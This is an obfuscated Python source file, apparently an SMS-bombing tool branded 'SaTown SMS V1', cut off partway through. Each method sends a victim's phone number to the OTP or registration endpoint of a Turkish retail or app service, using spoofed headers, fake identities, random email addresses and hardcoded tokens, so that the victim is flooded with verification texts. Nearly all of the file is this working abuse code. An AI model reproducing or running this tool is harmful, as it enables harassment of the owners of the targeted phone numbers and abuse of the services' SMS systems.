import requests #line:1
from random import choice #line:2
from string import ascii_lowercase #line:3
from colorama import Fore ,Style #line:4
class SendSms ():#line:7
    adet =0 #line:8
    def __init__ (OOOOOO00000O00OOO ,O0O0OOOO00O0OOOO0 ,OO0OOOOO0O00OOO00 ):#line:10
        OOOOOO00000O00OOO .phone =str (O0O0OOOO00O0OOOO0 )#line:11
        if len (OO0OOOOO0O00OOO00 )!=0 :#line:12
            OOOOOO00000O00OOO .mail =OO0OOOOO0O00OOO00 #line:13
        else :#line:14
            OOOOOO00000O00OOO .mail =''.join (choice (ascii_lowercase )for O0O000000O00O00OO in range (20 ))+"@gmail.com"#line:15
    def KahveDunyasi (O0O00000O0000O00O ):#line:19
        try :#line:20
            O0000OOOOO0000O0O ="https://core.kahvedunyasi.com:443/api/users/sms/send"#line:21
            O00000OO0OOO0OOOO ={"User-Agent":"Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0","Accept":"application/json, text/plain, */*","Accept-Language":"en-US,en;q=0.5","Accept-Encoding":"gzip, deflate, br","Page-Url":"/kayit-ol","Content-Type":"application/json;charset=utf-8","Positive-Client":"kahvedunyasi","Positive-Client-Type":"web","Store-Id":"1","Origin":"https://www.kahvedunyasi.com","Dnt":"1","Sec-Gpc":"1","Referer":"https://www.kahvedunyasi.com/","Sec-Fetch-Dest":"empty","Sec-Fetch-Mode":"cors","Sec-Fetch-Site":"same-site","Te":"trailers","Connection":"close"}#line:22
            O00O00O0O0O00OOOO ={"mobile_number":O0O00000O0000O00O .phone ,"token_type":"register_token"}#line:23
            OO00OO0OOO0OO0O0O =requests .post (O0000OOOOO0000O0O ,headers =O00000OO0OOO0OOOO ,json =O00O00O0O0O00OOOO ,timeout =6 )#line:24
            if OO00OO0OOO0OO0O0O .status_code ==200 :#line:25
                print (f"{Fore.LIGHTGREEN_EX}[+] {Fore.WHITE}SaTown SMS V1 - {Fore.LIGHTGREEN_EX}Başarılı! ! {O0O00000O0000O00O.phone} --> core.kahvedunyasi.com")#line:26
                O0O00000O0000O00O .adet +=1 #line:27
            else :#line:28
                raise #line:29
        except :#line:30
            print (f"{Fore.LIGHTRED_EX}[-] {Fore.WHITE}SaTown SMS V1 - {Fore.LIGHTRED_EX}Başarısız!  {O0O00000O0000O00O.phone} --> core.kahvedunyasi.com")#line:31
    def Wmf (OOO0O0O0OOOOOO00O ):#line:35
        try :#line:36
            OO0O0OOOOOO000000 =requests .post ("https://www.wmf.com.tr/users/register/",data ={"confirm":"true","date_of_birth":"1956-03-01","email":OOO0O0O0OOOOOO00O .mail ,"email_allowed":"true","first_name":"Memati","gender":"male","last_name":"Bas","password":"31ABC..abc31","phone":f"0{OOO0O0O0OOOOOO00O.phone}"},timeout =6 )#line:47
            if OO0O0OOOOOO000000 .status_code ==202 :#line:48
                print (f"{Fore.LIGHTGREEN_EX}[+] {Fore.WHITE}SaTown SMS V1 - {Fore.LIGHTGREEN_EX}Başarılı! ! {OOO0O0O0OOOOOO00O.phone} --> wmf.com.tr")#line:49
                OOO0O0O0OOOOOO00O .adet +=1 #line:50
            else :#line:51
                raise #line:52
        except :#line:53
            print (f"{Fore.LIGHTRED_EX}[-] {Fore.WHITE}SaTown SMS V1 - {Fore.LIGHTRED_EX}Başarısız!  {OOO0O0O0OOOOOO00O.phone} --> wmf.com.tr")#line:54
    def Bim (O00O00OO000OOO000 ):#line:58
        try :#line:59
            OOOOO0OOO0OOO0O00 =requests .post ("https://bim.veesk.net:443/service/v1.0/account/login",json ={"phone":O00O00OO000OOO000 .phone },timeout =6 )#line:60
            if OOOOO0OOO0OOO0O00 .status_code ==200 :#line:61
                print (f"{Fore.LIGHTGREEN_EX}[+] {Fore.WHITE}SaTown SMS V1 - {Fore.LIGHTGREEN_EX}Başarılı! ! {O00O00OO000OOO000.phone} --> bim.veesk.net")#line:62
                O00O00OO000OOO000 .adet +=1 #line:63
            else :#line:64
                raise #line:65
        except :#line:66
            print (f"{Fore.LIGHTRED_EX}[-] {Fore.WHITE}SaTown SMS V1 - {Fore.LIGHTRED_EX}Başarısız!  {O00O00OO000OOO000.phone} --> bim.veesk.net")#line:67
    def Englishhome (OO00000O0O0OO000O ):#line:71
        try :#line:72
            O0000OOOOOO00000O ="https://www.englishhome.com:443/api/member/sendOtp"#line:73
            OOO0000O0OO0O0OOO ={"User-Agent":"Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0","Accept":"*/*","Accept-Language":"en-US,en;q=0.5","Accept-Encoding":"gzip, deflate, br","Referer":"https://www.englishhome.com/","Content-Type":"application/json","Origin":"https://www.englishhome.com","Dnt":"1","Sec-Gpc":"1","Sec-Fetch-Dest":"empty","Sec-Fetch-Mode":"cors","Sec-Fetch-Site":"same-origin","Te":"trailers"}#line:74
            O000OO0O0O0O0O000 ={"Phone":"+90"+OO00000O0O0OO000O .phone }#line:75
            O0O00O0O0OOOO0O0O =requests .post (O0000OOOOOO00000O ,headers =OOO0000O0OO0O0OOO ,json =O000OO0O0O0O0O000 ,timeout =6 )#line:76
            if O0O00O0O0OOOO0O0O .json ()["isError"]==False :#line:77
                print (f"{Fore.LIGHTGREEN_EX}[+] {Fore.WHITE}SaTown SMS V1 - {Fore.LIGHTGREEN_EX}Başarılı! ! {OO00000O0O0OO000O.phone} --> englishhome.com")#line:78
                OO00000O0O0OO000O .adet +=1 #line:79
            else :#line:80
                raise #line:81
        except :#line:82
            print (f"{Fore.LIGHTRED_EX}[-] {Fore.WHITE}SaTown SMS V1 - {Fore.LIGHTRED_EX}Başarısız!  {OO00000O0O0OO000O.phone} --> englishhome.com")#line:83
    def Icq (OO0OOO000000O0O00 ):#line:87
        try :#line:88
            OO00O000O0OO0000O =f"https://u.icq.net:443/api/v90/smsreg/requestPhoneValidation.php?client=icq&f=json&k=gu19PNBblQjCdbMU&locale=en&msisdn=%2B90{OO0OOO000000O0O00.phone}&platform=ios&r=796356153&smsFormatType=human"#line:89
            O0000OOO0000OOOOO ={"Accept":"*/*","Content-Type":"application/x-www-form-urlencoded","User-Agent":"ICQ iOS #no_user_id# gu19PNBblQjCdbMU 23.1.1(124106) 15.7.7 iPhone9,4","Accept-Language":"en-US,en;q=0.9","Accept-Encoding":"gzip, deflate"}#line:90
            O00OOOOOO0000O000 =requests .post (OO00O000O0OO0000O ,headers =O0000OOO0000OOOOO ,timeout =6 )#line:91
            if O00OOOOOO0000O000 .json ()["response"]["statusCode"]==200 :#line:92
                print (f"{Fore.LIGHTGREEN_EX}[+] {Fore.WHITE}SaTown SMS V1 - {Fore.LIGHTGREEN_EX}Başarılı! ! {OO0OOO000000O0O00.phone} --> u.icq.net")#line:93
                OO0OOO000000O0O00 .adet +=1 #line:94
            else :#line:95
                raise #line:96
        except :#line:97
            print (f"{Fore.LIGHTRED_EX}[-] {Fore.WHITE}SaTown SMS V1 - {Fore.LIGHTRED_EX}Başarısız!  {OO0OOO000000O0O00.phone} --> u.icq.net")#line:98
    def Suiste (OOO0O000O0O000000 ):#line:102
        try :#line:103
            O00O00O0O00000O0O ="https://suiste.com:443/api/auth/code"#line:104
            OO0OO0OO0OOOOOO00 ={"Accept":"application/json","Content-Type":"application/x-www-form-urlencoded; charset=utf-8","Accept-Encoding":"gzip, deflate","Mobillium-Device-Id":"56DB9AC4-F52B-4DF1-B14C-E39690BC69FC","User-Agent":"suiste/1.6.16 (com.mobillium.suiste; build:1434; iOS 15.7.7) Alamofire/5.6.4","Accept-Language":"en"}#line:105
            OO0OOO0OOO000OO0O ={"action":"register","gsm":OOO0O000O0O000000 .phone }#line:106
            OO0OOOOO0O00OO0O0 =requests .post (O00O00O0O00000O0O ,headers =OO0OO0OO0OOOOOO00 ,data =OO0OOO0OOO000OO0O ,timeout =6 )#line:107
            if OO0OOOOO0O00OO0O0 .json ()["code"]=="common.success":#line:108
                print (f"{Fore.LIGHTGREEN_EX}[+] {Fore.WHITE}SaTown SMS V1 - {Fore.LIGHTGREEN_EX}Başarılı! ! {OOO0O000O0O000000.phone} --> suiste.com")#line:109
                OOO0O000O0O000000 .adet +=1 #line:110
            else :#line:111
                raise #line:112
        except :#line:113
            print (f"{Fore.LIGHTRED_EX}[-] {Fore.WHITE}SaTown SMS V1 - {Fore.LIGHTRED_EX}Başarısız!  {OOO0O000O0O000000.phone} --> suiste.com")#line:114
    def KimGb (O0O0O00000OO000O0 ):#line:118
        try :#line:119
            OO000OOO00O0O000O =requests .post ("https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com:443/api/auth/send-otp",json ={"msisdn":f"90{O0O0O00000OO000O0.phone}"},timeout =6 )#line:120
            if OO000OOO00O0O000O .status_code ==200 :#line:121
                print (f"{Fore.LIGHTGREEN_EX}[+] {Fore.WHITE}SaTown SMS V1 - {Fore.LIGHTGREEN_EX}Başarılı! ! {O0O0O00000OO000O0.phone} --> 3uptzlakwi.execute-api.eu-west-1.amazonaws.com")#line:122
                O0O0O00000OO000O0 .adet +=1 #line:123
            else :#line:124
                raise #line:125
        except :#line:126
            print (f"{Fore.LIGHTRED_EX}[-] {Fore.WHITE}SaTown SMS V1 - {Fore.LIGHTRED_EX}Başarısız!  {O0O0O00000OO000O0.phone} --> 3uptzlakwi.execute-api.eu-west-1.amazonaws.com")#line:127
    def Tazi (O0000OO00O0O00OO0 ):#line:131
        try :#line:132
            O000OOOOOOOOO0O00 ="https://mobileapiv2.tazi.tech:443/C08467681C6844CFA6DA240D51C8AA8C/uyev2/smslogin"#line:133
            OOO00OOO0O00OO000 ={"Accept":"application/json, text/plain, */*","Content-Type":"application/json;charset=utf-8","Accept-Encoding":"gzip, deflate","User-Agent":"Taz%C4%B1/3 CFNetwork/1335.0.3 Darwin/21.6.0","Accept-Language":"tr-TR,tr;q=0.9","Authorization":"Basic dGF6aV91c3Jfc3NsOjM5NTA3RjI4Qzk2MjRDQ0I4QjVBQTg2RUQxOUE4MDFD"}#line:134
            OO00O0O0OO0OOOOO0 ={"cep_tel":O0000OO00O0O00OO0 .phone ,"cep_tel_ulkekod":"90"}#line:135
            O0OO0000OOO0O00OO =requests .post (O000OOOOOOOOO0O00 ,headers =OOO00OOO0O00OO000 ,json =OO00O0O0OO0OOOOO0 ,timeout =6 )#line:136
            if (O0OO0000OOO0O00OO .json ()["kod"])=="0000":#line:137
                print (f"{Fore.LIGHTGREEN_EX}[+] {Fore.WHITE}SaTown SMS V1 - {Fore.LIGHTGREEN_EX}Başarılı! ! {O0000OO00O0O00OO0.phone} --> mobileapiv2.tazi.tech")#line:138
                O0000OO00O0O00OO0 .adet +=1 #line:139
            else :#line:140
                raise #line:141
        except :#line:142
            print (f"{Fore.LIGHTRED_EX}[-] {Fore.WHITE}SaTown SMS V1 - {Fore.LIGHTRED_EX}Başarısız!  {O0000OO00O0O00OO0.phone} --> mobileapiv2.tazi.tech")#line:143
    def Evidea (O000O0O0000O000O0 ):#line:147
        try :#line:148
            O0O000OO0OO0O0O0O ="https://www.evidea.com:443/users/register/"#line:149
            OO0OOO0O00OO00OOO ={"Content-Type":"multipart/form-data; boundary=fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi","X-Project-Name":"undefined","Accept":"application/json, text/plain, */*","X-App-Type":"akinon-mobile","X-Requested-With":"XMLHttpRequest","Accept-Language":"tr-TR,tr;q=0.9","Cache-Control":"no-store","Accept-Encoding":"gzip, deflate","X-App-Device":"ios","Referer":"https://www.evidea.com/","User-Agent":"Evidea/1 CFNetwork/1335.0.3 Darwin/21.6.0","X-Csrftoken":"7NdJbWSYnOdm70YVLIyzmylZwWbqLFbtsrcCQdLAEbnx7a5Tq4njjS3gEElZxYps"}#line:150
            OO0O0OOO0O0O0O000 =f"--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"first_name\"\r\n\r\nMemati\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"last_name\"\r\n\r\nBas\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"email\"\r\n\r\n{O000O0O0000O000O0.mail}\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"email_allowed\"\r\n\r\nfalse\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"sms_allowed\"\r\n\r\ntrue\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"password\"\r\n\r\n31ABC..abc31\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"phone\"\r\n\r\n0{O000O0O0000O000O0.phone}\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"confirm\"\r\n\r\ntrue\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi--\r\n"#line:151
            OO0OOOOO00OO000O0 =requests .post (O0O000OO0OO0O0O0O ,headers =OO0OOO0O00OO00OOO ,data =OO0O0OOO0O0O0O000 ,timeout =6 )#line:152
            if OO0OOOOO00OO000O0 .status_code ==202 :#line:153
                print (f"{Fore.LIGHTGREEN_EX}[+] {Fore.WHITE}SaTown SMS V1 - {Fore.LIGHTGREEN_EX}Başarılı! ! {O000O0O0000O000O0.phone} --> evidea.com")#line:154
                O000O0O0000O000O0 .adet +=1 #line:155
            else :#line:156
                raise #line:157
        except :#line:158
            print (f"{Fore.LIGHTRED_EX}[-] {Fore.WHITE}SaTown SMS V1 - {Fore.LIGHTRED_EX}Başarısız!  {O000O0O0000O000O0.phone} --> evidea.com")#line:159
    def Hey (O0O0OO0OO00OO00O0 ):#line:163
        try :#line:164
            OO0O0OO0OO00O0O00 =f"https://heyapi.heymobility.tech:443/V14//api/User/ActivationCodeRequest?organizationId=9DCA312E-18C8-4DAE-AE65-01FEAD558739&phonenumber={O0O0OO0OO00OO00O0.phone}&requestid=18bca4e4-2f45-41b0-b054-3efd5b2c9c57-20230730&territoryId=738211d4-fd9d-4168-81a6-b7dbf91170e9"#line:165
            OOOO00O00OO00O00O ={"Accept":"application/json, text/plain, */*","Accept-Encoding":"gzip, deflate","User-Agent":"HEY!%20Scooter/143 CFNetwork/1335.0.3.2 Darwin/21.6.0","Accept-Language":"tr"}#line:166
            OO00OO00OOOOO00O0 =requests .post (OO0O0OO0OO00O0O00 ,headers =OOOO00O00OO00O00O ,timeout =6 )#line:167
            if OO00OO00OOOOO00O0 .json ()["IsSuccess"]==True :#line:168
                print (f"{Fore.LIGHTGREEN_EX}[+] {Fore.WHITE}SaTown SMS V1 - {Fore.LIGHTGREEN_EX}Başarılı! ! {O0O0OO0OO00OO00O0.phone} --> heyapi.heymobility.tech")#line:169
                O0O0OO0OO00OO00O0 .adet +=1 #line:170
            else :#line:171
                raise #line:172
        except :#line:173
            print (f"{Fore.LIGHTRED_EX}[-] {Fore.WHITE}SaTown SMS V1 - {Fore.LIGHTRED_EX}Başarısız!  {O0O0OO0OO00OO00O0.phone} --> heyapi.heymobility.tech")#line:174
    def Bisu (O0O0O0OOO00O000O0 ):#line:178
        try :#line:179
            O0O0O0000000OO0O0 ="https://www.bisu.com.tr:443/api/v2/app/authentication/phone/register"#line:180
            O00OOO000OOO000O0 ={"Content-Type":"application/x-www-form-urlencoded; charset=utf-8","X-Device-Platform":"IOS","X-Build-Version-Name":"9.4.0","Authorization":"0561b4dd-e668-48ac-b65e-5afa99bf098e","X-Build-Version-Code":"22","Accept":"*/*","X-Device-Manufacturer":"Apple","X-Device-Locale":"en","X-Client-Device-Id":"66585653-CB6A-48CA-A42D-3F266677E3B5","Accept-Language":"en-US,en;q=0.9","Accept-Encoding":"gzip, deflate","X-Device-Platform-Version":"15.7.7","User-Agent":"BiSU/22 CFNetwork/1335.0.3.2 Darwin/21.6.0","X-Device-Model":"iPhone 7 Plus","X-Build-Type":"Release"}#line:181
            OO00OO0O0OOO0OO00 ={"phoneNumber":O0O0O0OOO00O000O0 .phone }#line:182
            OO0OOOOOOOO0O000O =requests .post (O0O0O0000000OO0O0 ,headers =O00OOO000OOO000O0 ,data =OO00OO0O0OOO0OO00 ,timeout =6 )#line:183
            if OO0OOOOOOOO0O000O .json ()["errors"]==None :#line:184
                print (f"{Fore.LIGHTGREEN_EX}[+] {Fore.WHITE}SaTown SMS V1 - {Fore.LIGHTGREEN_EX}Başarılı! ! {O0O0O0OOO00O000O0.phone} --> bisu.com.tr")#line:185
                O0O0O0OOO00O000O0 .adet +=1 #line:186
            else :#line:187
                raise #line:188
        except :#line:189
            print (f"{Fore.LIGHTRED_EX}[-] {Fore.WHITE}SaTown SMS V1 - {Fore.LIGHTRED_EX}Başarısız!  {O0O0O0OOO00O000O0.phone} --> bisu.com.tr")#line:190
    def Ucdortbes (O0OO000OO000O0000 ):#line:194
        try :#line:195
            O000O00OO00OO0O0O ="https://api.345dijital.com:443/api/users/register"#line:196
            OOOO0OOOO00O0O0O0 ={"Accept":"application/json, text/plain, */*","Content-Type":"application/json","Accept-Encoding":"gzip, deflate","User-Agent":"AriPlusMobile/21 CFNetwork/1335.0.3.2 Darwin/21.6.0","Accept-Language":"en-US,en;q=0.9","Authorization":"null","Connection":"close"}#line:197
            O00OO000OOOO0O0O0 ={"email":"","name":"Memati","phoneNumber":f"+90{O0OO000OO000O0000.phone}","surname":"Bas"}#line:198
            O0OO00O0OOO000OOO =requests .post (O000O00OO00OO0O0O ,headers =OOOO0OOOO00O0O0O0 ,json =O00OO000OOOO0O0O0 ,timeout =6 )#line:199
            if O0OO00O0OOO000OOO .json ()["error"]=="E-Posta veya telefon zaten kayıtlı!":#line:200
                print (f"{Fore.LIGHTRED_EX}[-] {Fore.WHITE}SaTown SMS V1 - {Fore.LIGHTRED_EX}Başarısız!  {O0OO000OO000O0000.phone} --> api.345dijital.com")#line:201
            else :#line:202
                raise #line:203
        except :#line:204
            print (f"{Fore.LIGHTGREEN_EX}[+] {Fore.WHITE}SaTown SMS V1 - {Fore.LIGHTGREEN_EX}Başarılı! ! {O0OO000OO000O0000.phone} --> api.345dijital.com")#line:205
            O0OO000OO000O0000 .adet +=1 #line:206
    def Macro (O0000O0OO000OO000 ):#line:210
        try :#line:211
            O000OO0O0000OO000 ="https://www.macrocenter.com.tr:443/rest/users/register/otp?reid=31"#line:212
            O00OO0O000O0O0O00 ={"User-Agent":"Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0","Accept":"application/json","Accept-Language":"en-US,en;q=0.5","Accept-Encoding":"gzip, deflate, br","Referer":"https://www.macrocenter.com.tr/kayit","Content-Type":"application/json","X-Forwarded-Rest":"true","X-Pwa":"true","X-Device-Pwa":"true","Origin":"https://www.macrocenter.com.tr","Dnt":"1","Sec-Gpc":"1","Sec-Fetch-Dest":"empty","Sec-Fetch-Mode":"cors","Sec-Fetch-Site":"same-origin","Te":"trailers"}#line:213
            O00OOOO0OOO00OO0O ={"email":O0000O0OO000OO000 .mail ,"phoneNumber":O0000O0OO000OO000 .phone }#line:214
            O0O0OO0OO00O0O0O0 =requests .post (O000OO0O0000OO000 ,headers =O00OO0O000O0O0O00 ,json =O00OOOO0OOO00OO0O ,timeout =6 )#line:215
            if O0O0OO0OO00O0O0O0 .json ()["successful"]==True :#line:216
                print (f"{Fore.LIGHTGREEN_EX}[+] {Fore.WHITE}SaTown SMS V1 - {Fore.LIGHTGREEN_EX}Başarılı! ! {O0000O0OO000OO000.phone} --> macrocenter.com.tr")#line:217
                O0000O0OO000OO000 .adet +=1 #line:218
            else :#line:219
                raise #line:220
        except :#line:221
            print (f"{Fore.LIGHTRED_EX}[-] {Fore.WHITE}SaTown SMS V1 - {Fore.LIGHTRED_EX}Başarısız!  {O0000O0OO000OO000.phone} --> macrocenter.com.tr")#line:222
    def TiklaGelsin (OO00O000O0O0O0OO0 ):#line:226
        try :#line:227
            OO0000OO00O0OOOOO ="https://svc.apps.tiklagelsin.com:443/user/graphql"#line:228
            O0OO0O0O0OO0O000O ={"Content-Type":"application/json","X-Merchant-Type":"0","Accept":"*/*","Appversion":"2.4.1","Accept-Language":"en-US,en;q=0.9","Accept-Encoding":"gzip, deflate","X-No-Auth":"true","User-Agent":"TiklaGelsin/809 CFNetwork/1335.0.3.2 Darwin/21.6.0","X-Device-Type":"2"}#line:229
            O00000OOOOO0O0O00 ={"operationName":"GENERATE_OTP","query":"mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) {\n  generateOtp(phone: $phone, challenge: $challenge, deviceUniqueId: $deviceUniqueId)\n}\n","variables":{"challenge":"3d6f9ff9-86ce-4bf3-8ba9-4a85ca975e68","deviceUniqueId":"720932D5-47BD-46CD-A4B8-086EC49F81AB","phone":f"+90{OO00O000O0O0O0OO0.phone}"}}#line:230
            O00O00OO0OO0OO0OO =requests .post (OO0000OO00O0OOOOO ,headers =O0OO0O0O0OO0O000O ,json =O00000OOOOO0O0O00 ,timeout =6 )#line:231
            if O00O00OO0OO0OO0OO .json ()["data"]["generateOtp"]==True :#line:232
                print (f"{Fore.LIGHTGREEN_EX}[+] {Fore.WHITE}SaTown SMS V1 - {Fore.LIGHTGREEN_EX}Başarılı! ! {OO00O000O0O0O0OO0.phone} --> svc.apps.tiklagelsin.com")#line:233
                OO00O000O0O0O0OO0 .adet +=1 #line:234
            else :#line:235
                raise #line:236
        except :#line:237
            print (f"{Fore.LIGHTRED_EX}[-] {Fore.WHITE}SaTown SMS V1 - {Fore.LIGHTRED_EX}Başarısız!  {OO00O000O0O0O0OO0.phone} --> svc.apps.tiklagelsin.com")#line:238
    def Ayyildiz (O0000OO0OO0O0OO00 ):#line:242
        try :#line:243
            OO0OOO00OO0OO0OOO =f"https://api.altinyildizclassics.com:443/mobileapi2/autapi/CreateSmsOtpForRegister?gsm={O0000OO0OO0O0OO00.phone}"#line:244
            OOOOO0OO00O000OOO ={"Accept":"*/*","Token":"MXZ5NTJ82WXBUJB7KBP10AGR3AF6S4GB95VZDU4G44JFEIN3WISAC2KLRIBNONQ7QVCZXM3ZHI661AMVXLKJLF9HUKI5SQ2ROMZS","Devicetype":"mobileapp","Accept-Encoding":"gzip, deflate","User-Agent":"altinyildiz/2.7 (com.brmagazacilik.altinyildiz; build:2; iOS 15.7.7) Alamofire/2.7","Accept-Language":"en-TR;q=1.0, tr-TR;q=0.9"}#line:245
            OOOO0OO0OO0O0O000 =requests .post (OO0OOO00OO0OO0OOO ,headers =OOOOO0OO00O000OOO ,timeout =6 )#line:246
            if OOOO0OO0OO0O0O000 .json ()["Success"]==True :#line:247
                print (f"{Fore.LIGHTGREEN_EX}[+] {Fore.WHITE}SaTown SMS V1 - {Fore.LIGHTGREEN_EX}Başarılı! ! {O0000OO0OO0O0OO00.phone} --> api.altinyildizclassics.com")#line:248
                O0000OO0OO0O0OO00 .adet +=1 #line:249
            else :#line:250
                raise #line:251
        except :#line:252
            print (f"{Fore.LIGHTRED_EX}[-] {Fore.WHITE}SaTown SMS V1 - {Fore.LIGHTRED_EX}Başarısız!  {O0000OO0OO0O0OO00.phone} --> api.altinyildizclassics.com")#line:253
    def Naosstars (O00O00O00OOO0O00O ):#line:257
        try :#line:258
            O00OO00O000O0OO00 ="https://api.naosstars.com:443/api/smsSend/9c9fa861-cc5d-43b0-b4ea-1b541be15350"#line:259
            OOO0OO0OO00OOO0O0 ={"Uniqid":"9c9fa861-cc5d-43c0-b4ea-1b541be15351","User-Agent":"naosstars/1.0030 CFNetwork/1335.0.3.2 Darwin/21.6.0","Access-Control-Allow-Origin":"*","Locale":"en-TR","Version":"1.0030","Os":"ios","Apiurl":"https://api.naosstars.com/api/","Device-Id":"D41CE5F3-53BB-42CF-8611-B4FE7529C9BC","Platform":"ios","Accept-Language":"en-US,en;q=0.9","Timezone":"Europe/Istanbul","Globaluuidv4":"d57bd5d2-cf1e-420c-b43d-61117cf9b517","Timezoneoffset":"-180","Accept":"application/json","Content-Type":"application/json; charset=utf-8","Accept-Encoding":"gzip, deflate","Apitype":"mobile_app"}#line:260
            O0O0OO0O0000OO00O ={"telephone":f"+90{O00O00O00OOO0O00O.phone}","type":"register"}#line:261
            OO000000O0O000O00 =requests .post (O00OO00O000O0OO00 ,headers =OOO0OO0OO00OOO0O0 ,json =O0O0OO0O0000OO00O ,timeout =6 )#line:262
            if OO000000O0O000O00 .status_code ==200 :#line:263
                print (f"{Fore.LIGHTGREEN_EX}[+] {Fore.WHITE}SaTown SMS V1 - {Fore.LIGHTGREEN_EX}Başarılı! ! {O00O00O00OOO0O00O.phone} --> api.naosstars.com")#line:264
                O00O00O00OOO0O00O .adet +=1 #line:265
            else :#line:266
                raise #line:267
        except :#line:268
            print (f"{Fore.LIGHTRED_EX}[-] {Fore.WHITE}SaTown SMS V1 - {Fore.LIGHTRED_EX}Başarısız!  {O00O00O00OOO0O00O.phone} --> api.naosstars.com")#line:269
    def Istegelsin (OO0OO00OO00OOO0O0 ):#line:273
        try :#line:274
            OOO000O00O0O00O00 ="https://prod.fasapi.net:443/"#line:275
            O00000OOO0OOO0OOO ={"Accept":"*/*","Content-Type":"application/x-www-form-urlencoded","App-Version":"2528","Accept-Encoding":"gzip, deflate","Platform":"IOS","User-Agent":"ig-sonkullanici-ios/161 CFNetwork/1335.0.3.2 Darwin/21.6.0","Accept-Language":"en-US,en;q=0.9"}#line:276
            OO000OO0O0OO0O000 ={"operationName":"SendOtp2","query":"mutation SendOtp2($phoneNumber: String!) {\n  sendOtp2(phoneNumber: $phoneNumber) {\n    __typename\n    alreadySent\n    remainingTime\n  }\n}","variables":{"phoneNumber":f"90{OO0OO00OO00OOO0O0.phone}"}}#line:277
            OOO000OO0OOOOO000 =requests .post (OOO000O00O0O00O00 ,headers =O00000OOO0OOO0OOO ,json =OO000OO0O0OO0O000 ,timeout =6 )#line:278
            if OOO000OO0OOOOO000 .json ()["data"]["sendOtp2"]["alreadySent"]==False :#line:279
                print (f"{Fore.LIGHTGREEN_EX}[+] {Fore.WHITE}SaTown SMS V1 - {Fore.LIGHTGREEN_EX}Başarılı! ! {OO0OO00OO00OOO0O0.phone} --> prod.fasapi.net")#line:280
                OO0OO00OO00OOO0O0 .adet +=1 #line:281
            else :#line:282
                raise #line:283
        except :#line:284
            print (f"{Fore.LIGHTRED_EX}[-] {Fore.WHITE}SaTown SMS V1 - {Fore.LIGHTRED_EX}Başarısız!  {OO0OO00OO00OOO0O0.phone} --> prod.fasapi.net")#line:285
    def Koton (OOO0OO000000OOOO0 ):#line:289
        try :#line:290
            OO0O00OO0OO00OOO0 ="https://www.koton.com:443/users/register/"#line:291
            O000O000OOOOOO0OO ={"Content-Type":"multipart/form-data; boundary=sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk","X-Project-Name":"rn-env","Accept":"application/json, text/plain, */*","X-App-Type":"akinon-mobile","X-Requested-With":"XMLHttpRequest","Accept-Language":"en-US,en;q=0.9","Cache-Control":"no-store","Accept-Encoding":"gzip, deflate","X-App-Device":"ios","Referer":"https://www.koton.com/","User-Agent":"Koton/1 CFNetwork/1335.0.3.2 Darwin/21.6.0","X-Csrftoken":"5DDwCmziQhjSP9iGhYE956HHw7wGbEhk5kef26XMFwhELJAWeaPK3A3vufxzuWcz"}#line:292
            OO000O000O00O000O =f"--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"first_name\"\r\n\r\nMemati\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"last_name\"\r\n\r\nBas\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"email\"\r\n\r\n{OOO0OO000000OOOO0.mail}\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"password\"\r\n\r\n31ABC..abc31\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"phone\"\r\n\r\n0{OOO0OO000000OOOO0.phone}\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"confirm\"\r\n\r\ntrue\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; 